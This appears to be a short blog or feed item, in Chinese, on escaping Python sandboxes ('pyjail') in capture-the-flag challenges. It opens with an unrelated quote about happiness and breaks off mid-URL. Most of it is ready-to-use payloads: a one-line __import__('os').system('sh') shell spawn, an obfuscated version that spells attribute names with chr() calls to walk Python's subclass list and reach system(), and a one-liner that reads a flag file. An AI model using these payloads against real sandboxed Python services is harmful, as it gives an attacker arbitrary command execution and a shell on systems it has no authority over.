item.title: 绕过pyjail——一句话RCE
item.description: Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley 基础版 __import__('os').system('sh') 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用: open(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanla
